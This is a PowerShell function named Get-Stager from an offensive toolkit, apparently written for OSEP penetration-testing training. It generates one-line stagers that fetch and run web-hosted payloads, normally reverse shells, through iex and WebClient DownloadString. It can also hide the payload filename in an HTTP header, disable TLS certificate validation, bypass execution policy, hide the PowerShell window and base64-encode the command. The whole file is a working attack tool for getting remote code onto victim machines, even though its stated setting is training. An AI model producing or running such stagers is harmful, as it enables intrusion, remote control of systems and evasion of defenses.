function Get-Stager {
#.SYNOPSIS
# Simple PowerShell stager generator to point to web hosted payloads.
# ARBITRARY VERSION NUMBER:  3.5.3
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Originally developed for OSEP, this script is meant to create really simple custom stagers
# that point to web hosted payloads (normally reverse shells).  The only robust portion of 
# this script is the that it allows communication with the PMA server over HTTPS by preloading
# the stager with a self-signed certificate bypass if the payload URL is using HTTPS.
#
# As of version 3.0.0, simple command support has been added.  Now you can specify a simple
# command to execute if you don't want a complete reverse shell.  By default, the payload
# is returned base64 encoded.
# 
# Parameters:
#   -PayloadURL          -->  URL pointing to the reverse shell payload
#   -Opsec               -->  Point to root URL and hide filename in HTTP headers.
#   -Command             -->  PowerShell command to execute instead of a reverse shell stager
#   -Raw                 -->  Return stager payload in cleartext rather than base64
#   -Binary              -->  PowerShell binary to use (default: 'powershell')
#   -Headless            -->  Create stager payload without '-nop -ex bypass -wi h' parameters
#   -PowerShell2Support  -->  Adjust WebClients to work in PowerShell 2.0
#   -Help                -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        [string]$PayloadURL = 'http(s)://<ip_addr>/<payload>',
        [switch]$Opsec,
        [string]$Command,
        [switch]$Raw,
        [string]$Binary = 'powershell',
        [switch]$Headless,
        [switch]$PowerShell2Support,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return Get-Help Get-Stager }


    # Minor Error Correction
    if (!$Command) {
        if ($PayloadURL -eq 'http(s)://<ip_addr>/<payload>') { return (Write-Host '[-] Missing hosted payload URL.' -ForegroundColor Red) }
        if ($PayloadURL -notlike "http*")                    { return (Write-Host '[-] Invalid URL.' -ForegroundColor Red) }
    }


    # Use a Specified Command instead of a Reverse Shell Stager
    else {
        $PayloadURL = $NULL
        $Payload = $Command
    }


    # Bypass Self-Signed Certificate Restriction
    if ($PayloadURL -like "https:*") {
        $Bypass = @"
`$CertificateBypass = @'
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object obj, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static void WebClientBypass()
    {
        ServicePointManager.ServerCertificateValidationCallback = Bypass;
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
}
'@
Add-Type `$CertificateBypass
[SelfSignedCerts]::WebClientBypass()`n
"@;
    }
    else { $Bypass = $NULL }


    # RevShell Grabber
    if (!$Command) {
        
        # Use Base URL and hide Filename in HTTP Headers
        if ($Opsec) {
        
            $OpsecFilename = $PayloadURL.Split('/')[-1]
            $OpsecURL = $PayloadURL.Replace("/$OpsecFilename",'')

            if ($PowerShell2Support) { $Payload = "`$w=(New-Object System.Net.WebClient);`$w.Headers.Add('file','$OpsecFilename');iex (`$w.DownloadString('$OpsecURL'))"  }
            else                     { $Payload = "`$w=[System.Net.WebClient]::new();`$w.Headers.Add('file','$OpsecFilename');iex (`$w.DownloadString('$OpsecURL'))"      }
        }

        # Standard Stager w/ Filename at the end of the URL
        else {
            if ($PowerShell2Support) { $Payload = "iex ((New-Object System.Net.WebClient).DownloadString('$PayloadURL'))" }
            else                     { $Payload = "iex ([System.Net.WebClient]::new().DownloadString('$PayloadURL'))"     }
        }
    }


    # Assemble Finalized Payload
    $Stager = $Bypass + $Payload


    # Toggle PowerShell 2
    if ($PowerShell2Support) { $BinParams = $Binary + ' -version 2' }
    else                     { $BinParams = $Binary                 }


    # Toggle '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden' PowerShell Parameters
    if (!$Headless) { $BinParams += ' -nop -ex bypass -wi h' } 


     # Cleartext or Base64 Payload
    if (!$Raw) { $FinalStager = "$BinParams -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Stager)) }
    else       { $FinalStager = "$BinParams -c {$Stager}" }


    return $FinalStager
}